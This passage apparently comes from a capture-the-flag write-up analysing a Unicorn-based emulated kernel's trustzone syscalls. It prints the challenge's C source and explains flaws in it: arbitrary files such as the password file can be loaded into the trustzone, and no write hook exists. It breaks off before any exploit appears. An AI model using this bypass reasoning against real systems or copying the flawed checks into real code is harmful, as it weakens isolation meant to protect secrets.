</div><p>This syscall maps a shared buffer into the process&rsquo;s address space at a specified address. It uses <code>uc_mem_map_ptr()</code> to create a mapping with full permissions (<code>UC_PROT_ALL</code>) between the specified address in the emulated process&rsquo;s address space and the provided host buffer. This syscall is protected by <code>TRUSTED_SYSCALL</code> since it allows arbitrary memory mapping between the emulated process&rsquo;s address space and any location in the host&rsquo;s address space, which could be dangerous if misused. The mapping allows the emulated process to read/write/execute the mapped memory region.</p>
<p><strong>create_trustzone</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//The trustzone is allowed to access trusted memory, no one else is.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">trusted_read</span><span class="p">(</span><span class="n">uc_engine</span> <span class="o">*</span><span class="n">uc</span><span class="p">,</span> <span class="n">uc_mem_type</span> <span class="n">type</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">value</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">user_data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span> <span class="o">=</span> <span class="n">user_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;TRUSTED READ: %p %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">address</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//Untrusted code tried to access trusted memory, abort the malicious process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Unprivileged access to trustzone attempted! Killing process</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">uc_emu_stop</span><span class="p">(</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">create_trustzone</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_engine</span><span class="o">*</span> <span class="n">uc</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">filename_user</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">strncpy_user</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">filename</span><span class="p">,</span><span class="n">filename_user</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to copy string from address %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">filename_user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;.&#39;</span> <span class="o">||</span> <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;_&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open trustzone %s %m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">off_t</span> <span class="n">size</span> <span class="o">=</span> <span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_mem_map</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">),</span><span class="n">UC_PROT_READ</span> <span class="o">|</span> <span class="n">UC_PROT_EXEC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_mem_map() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_hook_add</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">,</span><span class="n">UC_HOOK_MEM_READ</span><span class="p">,</span><span class="n">trusted_read</span><span class="p">,</span><span class="n">current</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">addr</span><span class="o">+</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_hook_add() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">uc_mem_unmap</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">file</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_mem_write</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;Trustzone allocated at %p %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall sets up a new trustzone region by loading code from an existing file in the system. It takes a file path and loads the code from that file into a new memory region that is mapped as <code>r-x</code> only, preventing any writes to the trustzone code. The syscall adds a <code>UC_HOOK_MEM_READ</code> hook that triggers the <code>trusted_read</code> callback function whenever there is any attempt to read from the trustzone memory region. This hook ensures that if code tries to read trustzone memory while not in trustzone mode (<code>trustzone_mode</code> = false), the emulation will be stopped immediately.</p>
<p>Another important observation is that there isn&rsquo;t any <code>HOOK</code> set for memory writes. This means the emulated program is actually <strong>ALLOWED</strong> to overwrite the <code>trustzone</code>. However, by default, the mapping address is <code>r-x</code>, so we can&rsquo;t write to the created trustzone. We will keep this in mind for now.</p>
<p><strong>destroy_trustzone</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">destroy_trustzone</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_mem_unmap</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">,</span><span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_hook_del</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall handles the cleanup of a trustzone region. When called, it removes all the memory protections and hooks that were previously set up to protect the trustzone. It then frees any resources that were allocated for the trustzone and resets all the associated trustzone state back to its initial values.</p>
<p><strong>trustzone_invoke</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">trustzone_invoke</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_reg_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">ip_reg</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">],</span><span class="o">&amp;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_emu_start</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">+</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;trustzone over %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="nf">uc_strerror</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_reg_write</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">ip_reg</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">],</span><span class="o">&amp;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall handles the execution of code within the trustzone&rsquo;s secure context. When invoked, it first enables trustzone mode by setting the <code>trustzone_mode</code> flag to true. This allows the trustzone code to execute with elevated privileges and access protected syscalls. Once the trustzone code finishes executing, the syscall resets the <code>trustzone_mode</code> flag back to false, returning execution to the normal unprivileged context. This mechanism ensures that privileged operations can only be performed within the controlled trustzone environment.</p>
<p><strong>memprot</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">memprot</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prot</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">uc_mem_protect</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">prot</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall is used to change the permission of the memory. When called, it takes a memory address and length to specify the region to modify, along with protection flags indicating the desired access rights. The syscall then updates the permissions on that memory region accordingly, allowing the system to enforce restrictions on whether the memory can be read from, written to, or executed as code. Like other sensitive operations, this syscall is protected by the <code>TRUSTED_SYSCALL</code> macro to ensure it can only be called from within the trustzone context.</p>
<p>Now, if we read through the <code>Documentation</code> that was given in the chal, we can see that there are three available trustzones that we can load and use in our emulated program:</p>
<ol>
<li><code>create_map_shared_x86_64</code>: This trustzone creates and maps a shared memory buffer.</li>
<li><code>map_shared_x86_64</code>: This trustzone maps an existing shared memory buffer to the process&rsquo;s address space.</li>
<li><code>memprot_x86_64</code>: This trustzone changes memory protection flags for the process&rsquo;s address space, but requires password authentication.</li>
</ol>
<p>So basically, we already have some context on how the app works. At first, the program looked quite safe to me, but after digging more through the code, I made some observations that revealed the app has bugs.</p>
<p>First, observed that in the <code>confirm_password</code> method below</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">confirm_password</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">password</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">password_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">password_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;open password failed: %m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">abort</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">password_fd</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">password_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">user_password</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">password</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">e</span> <span class="o">=</span> <span class="nf">strncpy_user</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">user_password</span><span class="p">,</span><span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">e</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">user_password</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_password</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The password was actually stored in a file named <code>password</code>. If we take a look back at the <code>create_trustzone</code> function, there isn&rsquo;t any validation actually whether the loaded file contains valid instructions or not. So, we can actually load <code>password</code> file and mapped the content to our process address space.</p>
<p>So basically, if we do this, we can make the <code>password</code> contents exist in the process memory, but we need to find a way to somehow leak the content, because remember that the intention of the challenge is that the unprivileged program shouldn&rsquo;t be able to access the <code>trustzone</code> area, and the content of <code>password</code> is in that area.</p>
<p>However, I noticed something when I checked how the <code>unicornel_write</code> syscall was implemented.</p>
<p><strong>unicornel_write</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">overlaps_tz</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span><span class="kt">long</span> <span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">src</span> <span class="o">+</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">||</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">+</span> <span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">uc_err</span> <span class="nf">safe_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">long</span> <span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
